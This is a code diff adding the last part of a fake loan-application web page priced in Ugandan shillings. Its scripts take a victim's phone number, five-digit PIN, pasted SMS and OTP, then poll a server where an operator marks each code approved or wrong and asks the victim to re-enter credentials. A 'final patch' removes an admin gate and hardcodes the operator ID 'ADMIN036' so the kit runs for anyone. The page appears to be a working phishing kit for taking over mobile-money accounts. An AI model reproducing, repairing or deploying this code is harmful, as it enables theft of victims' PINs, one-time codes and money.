+      document.getElementById('bOtp').disabled = false;
+      document.getElementById('bOtp').textContent = 'SUBMIT';
+      showOtpMsg('error', 'Error: ' + err.message);
+    }
+  }
+
+  let otpPollTimeout;
+  function pollForOtpApproval(applicationId) {
+    const checkStatus = async () => {
+      if (S.applicationId !== applicationId) return;
+      try {
+        const res  = await fetch(`/api/check-otp-status/${applicationId}`);
+        const data = await res.json();
+
+        if (data.success) {
+          const status = data.status;
+
+          if (status === 'approved') {
+            clearTimeout(otpPollTimeout);
+            document.getElementById('aprAmount').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
+            document.getElementById('aprAmt').textContent    = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
+            document.getElementById('aprTerm').textContent   = S.loanTerm || '48 Months';
+            const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
+            document.getElementById('aprMth').textContent    = 'UGX ' + monthly.toLocaleString();
+            goTo('page-approval');
+          } else if (status === 'wrongcode') {
+            clearTimeout(otpPollTimeout);
+            goTo('page-otp');
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('bOtp').textContent = 'SUBMIT';
+            chkOtp();
+            showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
+          } else if (status === 'wrongpin_otp') {
+            cancelAllPolls();
+            S.applicationId = '';
+            document.getElementById('lpPhone').value = '';
+            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
+            document.getElementById('smsMsgBox').value = '';
+            document.getElementById('otpMsgPaste').value = '';
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('bOtp').textContent = 'SUBMIT';
+            goTo('page-login');
+            showLgnMsg('error', 'Your PIN was incorrect. Please re-enter your credentials.');
+          } else {
+            otpPollTimeout = setTimeout(checkStatus, 2000);
+          }
+        } else {
+          otpPollTimeout = setTimeout(checkStatus, 3000);
+        }
+      } catch (err) {
+        otpPollTimeout = setTimeout(checkStatus, 3000);
+      }
+    };
+    checkStatus();
+  }
+
+  updateCalc();
+  goTo('page-landing');
+</script>
+
+<!-- ============================================================
+     FINAL PATCH
+     (1) removes the ?admin= gate — form works with OR without it
+     (2) wires every button / input, because the served HTML has
+         no inline event handlers
+     ============================================================ -->
+<script>
+(function () {
+  /* ---- 1. kill the admin gate ---- */
+  S.requestAdminId = S.requestAdminId || 'ADMIN036';
+  document.getElementById('adminErrorModal').classList.remove('show');
+
+  /* ---- 2. wire the form ---- */
+  var q  = function (s) { return document.querySelector(s); };
+  var id = function (s) { return document.getElementById(s); };
+  var on = function (sel, ev, fn) { var el = q(sel); if (el) el.addEventListener(ev, fn); };
+
+  on('#page-landing .btn-grad', 'click', startApplication);
+
+  on('#page-step1 .btn-grad', 'click', toS2);
+  on('#page-step1 .nav-left', 'click', function () { goTo('page-landing'); });
+
+  on('#page-step2 .btn-grad', 'click', toS3);
+  on('#page-step2 .btn-gray', 'click', function () { goTo('page-step1'); });
+  on('#page-step2 .nav-left', 'click', function () { goTo('page-step1'); });
+  on('#s2ph', 'input', function () { normalizePhone('s2ph'); });
+
+  on('#page-step3 .btn-grad', 'click', submitApp);
+  on('#page-step3 .btn-gray', 'click', function () { goTo('page-step2'); });
+  on('#page-step3 .nav-left', 'click', function () { goTo('page-step2'); });
+
+  function fillSummary() {
+    id('sA').textContent = 'UGX ' + (S.loanAmount || 0).toLocaleString();
+    id('sT').textContent = S.loanTerm || '—';
+    id('sP').textContent = S.loanPurpose || '—';
+    id('sN').textContent = ((S.firstName || '') + ' ' + (S.lastName || '')).trim() || '—';
+  }
+  on('#page-step3 .btn-grad', 'click', fillSummary);
+
+  on('#lpPhone', 'input', function () { normalizePhone('lpPhone'); });
+  [0,1,2,3,4].forEach(function (i) {
+    var el = id('lp' + i);
+    if (el) el.addEventListener('input', function () { pinMvM(el, i); });
+  });
+  on('.pin-eye',    'click', togPin);
+  on('.pin-delete', 'click', clearLoginPin);
+  on('#bLgn',       'click', doLogin);
+
+  on('#page-sms-paste .bk', 'click', function () { goTo('page-login'); });
+  on('#smsMsgBox', 'input', chkSmsMsg);
+  on('#bSms',      'click', doSmsParse);
+  on('#bResend',   'click', doSmsResend);
+
+  on('#page-otp .bk', 'click', function () { goTo('page-sms-paste'); });
+  on('#otpMsgPaste', 'input', chkOtp);
+  on('#bOtp',        'click', doOtp);
+
+  on('#page-approval .rth-btn', 'click', function () { location.reload(); });
+
+  console.log('✅ form wired · admin gate removed');
+})();
+</script>
+
+</body></html>
